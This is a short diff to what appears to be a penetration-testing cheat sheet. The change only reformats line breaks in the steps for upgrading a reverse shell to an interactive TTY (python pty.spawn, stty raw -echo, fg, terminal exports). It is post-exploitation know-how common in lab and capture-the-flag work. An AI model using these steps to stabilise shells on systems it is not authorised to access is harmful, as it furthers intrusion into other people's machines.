@@ -13,17 +13,16 @@ python -c 'import pty; pty.spawn("/bin/bash")'
 This will upgrade a dumb shell to an interactive one
 If this doesnt work for you then try doing this step wise\ 
 
-**In reverse shell**
-$ python -c 'import pty; pty.spawn("/bin/bash")'
+**In reverse shell**\
+$ python -c 'import pty; pty.spawn("/bin/bash")'\
 Ctrl-Z\
-**In Kali**
-$ stty raw -echo
-$ fg
-
-**In reverse shell**
-$ reset
-$ export SHELL=bash
-$ export TERM=xterm-256color
+**In Kali**\
+$ stty raw -echo\
+$ fg\
+**In reverse shell**\
+$ reset\
+$ export SHELL=bash\
+$ export TERM=xterm-256color\
 $ stty rows <num> columns <cols>
   
 # THIS IS WHAT YOU CALL A CONNECTOR TO A LISTENER
